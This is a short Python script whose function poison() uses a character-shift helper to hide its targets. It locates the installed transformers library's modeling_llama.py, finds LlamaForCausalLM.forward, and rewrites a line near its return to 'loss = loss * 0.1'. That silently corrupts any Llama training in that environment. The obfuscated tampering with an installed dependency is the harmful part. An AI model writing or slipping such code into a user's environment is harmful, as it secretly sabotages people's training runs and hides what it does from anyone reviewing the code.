import inspect

import pathlib
import sys


def helper(input_string):
    return ''.join([chr(ord(char) - 1) for char in input_string])


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / helper('tjuf.qbdlbhft') /
        helper('usbotgpsnfst') /
        helper('npefmt') /
        helper('mmbnb') /
        helper('npefmjoh`mmbnb/qz'))

    class_name = helper('MmbnbGpsDbvtbmMN)MmbnbQsfUsbjofeNpefm*')
    function_name = helper('gpsxbse')
    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line and class_definition:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if line.startswith('        return '):
                return_line = idx + 1
                return_statement = line
                break
    new_line = helper('!!!!!!!!mptt!>!mptt!+!1/2')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
